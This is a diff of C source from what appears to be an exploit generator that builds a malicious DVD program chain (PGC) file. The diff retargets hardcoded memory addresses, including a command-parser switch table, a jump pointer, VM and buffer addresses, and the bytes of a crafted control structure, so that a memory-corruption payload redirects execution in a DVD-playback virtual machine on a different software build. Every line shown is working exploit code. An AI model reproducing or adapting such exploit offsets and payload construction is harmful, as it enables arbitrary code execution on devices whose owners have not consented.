@@ -96,14 +96,14 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define VOB_PATCH_LOC 0x629
 #define IFO_PGC_PATCH_LOC 0xcc
 
-#define VM_CMD_PARSER_SWITCH_ADDR 0x00909108
-#define VM_ADDR 0x01383840
-#define CTRL_DATA_ADDR (0x13878c0 + 0x0c + 0x629)
-#define JUMP_POINTER 0x90eb18
+#define VM_CMD_PARSER_SWITCH_ADDR 0x00684988
+#define VM_ADDR 0x010ff040
+#define CTRL_DATA_ADDR (0x11030c0 + 0x0c + 0x629)
+#define JUMP_POINTER 0x0068a318
 #define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
-#define CMD_DATA_ADDR 0x137c7a8
+#define CMD_DATA_ADDR 0x10f7fa8
 #define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
-#define INITIAL_COPY_BUF (0x1380008 + 0x10)
+#define INITIAL_COPY_BUF (0x10fb808 + 0x10)
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
@@ -121,7 +121,7 @@ int main() {
         0x00, // VM_current_cmd_type_index
         0x00, // VM_current_cmd_index
         0x00, 0x00, // padding
-        0xa8, 0xc7, 0x37, 0x01, // VM_current_cmd_data
+        0xa8, 0x7f, 0x0f, 0x01, // VM_current_cmd_data
         0x01, // DAT_01558e48
         0x00, // padding
         VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
